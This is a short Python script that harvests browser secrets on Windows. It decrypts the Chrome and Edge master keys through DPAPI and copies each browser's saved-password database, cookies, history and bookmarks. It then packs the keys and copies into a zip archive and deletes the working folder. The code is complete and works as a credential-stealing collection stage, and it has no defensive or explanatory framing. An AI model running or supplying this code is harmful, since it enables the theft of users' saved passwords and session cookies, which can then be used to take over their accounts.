#!/usr/bin/env python3
# Get Sourse Data
# author: Aquilao
# v0.7 dev

import os
import json
import shutil
import base64
import win32crypt

def get_master_key(local_state_path, master_key_path):
    print(master_key_path)
    with open(os.environ['USERPROFILE'] + os.sep + local_state_path, "rb") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key_w_Cry = master_key[5:]
    master_key = win32crypt.CryptUnprotectData(master_key_w_Cry, None, None, None, 0)[1]
    print(master_key)
    with open(master_key_path, "wb") as key:
        key.write(master_key)

def copy_data(file_path, data_path):
    shutil.copy2(os.environ['USERPROFILE'] + os.sep + file_path, data_path)

def main():
    # Target File Path
    TARGET_FILE_PATH = {
        "CHROME_LOCAL_STATE_FILE_PATH" : r"AppData\Local\Google\Chrome\User Data\Local State",
        "CHROME_PASSWORDS_DB_PATH"     : r"AppData\Local\Google\Chrome\User Data\Default\Login Data",
        "CHROME_COOKIES_DB_PATH"       : r"AppData\Local\Google\Chrome\User Data\Default\Cookies",
        "CHROME_HISTORY_DB_PATH"       : r"AppData\Local\Google\Chrome\User Data\Default\History",
        "CHROME_BOOKMARKS_FILE_PATH"   : r"AppData\Local\Google\Chrome\User Data\Default\Bookmarks",
        "EDGE_LOCAL_STATE_FILE_PATH"   : r"AppData\Local\Microsoft\Edge\User Data\Local State",
        "EDGE_PASSWORDS_DB_PATH"       : r"AppData\Local\Microsoft\Edge\User Data\Default\Login Data",
        "EDGE_COOKIES_DB_PATH"         : r"AppData\Local\Microsoft\Edge\User Data\Default\Cookies",
        "EDGE_HISTORY_DB_PATH"         : r"AppData\Local\Microsoft\Edge\User Data\Default\History",
        "EDGE_BOOKMARKS_FILE_PATH"     : r"AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
    }
    # Sourse Data Path
    SOURSE_DATA_PATH = {
        "CHROME_LOCAL_STATE_FILE_PATH" : "Sourse_Data/Chrome_Local_State",
        "CHROME_PASSWORDS_DB_PATH"     : "Sourse_Data/Chrome_Login_Data",
        "CHROME_COOKIES_DB_PATH"       : "Sourse_Data/Chrome_Cookies",
        "CHROME_HISTORY_DB_PATH"       : "Sourse_Data/Chrome_History",
        "CHROME_BOOKMARKS_FILE_PATH"   : "Sourse_Data/Chrome_Bookmarks",
        "EDGE_LOCAL_STATE_FILE_PATH"   : "Sourse_Data/Edge_Local_State",
        "EDGE_PASSWORDS_DB_PATH"       : "Sourse_Data/Edge_Login_Data",
        "EDGE_COOKIES_DB_PATH"         : "Sourse_Data/Edge_Cookies",
        "EDGE_HISTORY_DB_PATH"         : "Sourse_Data/Edge_History",
        "EDGE_BOOKMARKS_FILE_PATH"     : "Sourse_Data/Edge_Bookmarks"
    }
    if not os.path.exists("Sourse_Data/"):
        os.makedirs("Sourse_Data/")
    if os.path.isfile(os.environ["USERPROFILE"] + os.sep + TARGET_FILE_PATH["CHROME_LOCAL_STATE_FILE_PATH"]):
        master_key_path = "Sourse_Data/chrome_masterkey"
        get_master_key(TARGET_FILE_PATH["CHROME_LOCAL_STATE_FILE_PATH"], master_key_path)
    if os.path.isfile(os.environ["USERPROFILE"] + os.sep + TARGET_FILE_PATH["EDGE_LOCAL_STATE_FILE_PATH"]):
        master_key_path = "Sourse_Data/edge_masterkey"
        get_master_key(TARGET_FILE_PATH["EDGE_LOCAL_STATE_FILE_PATH"], master_key_path)
    for file_path in TARGET_FILE_PATH:
        copy_data(TARGET_FILE_PATH[file_path], SOURSE_DATA_PATH[file_path])
    shutil.make_archive("Sourse_Data", "zip", os.getcwd() + "/Sourse_Data/")
    shutil.rmtree("Sourse_Data/")

if __name__ == "__main__":
    main()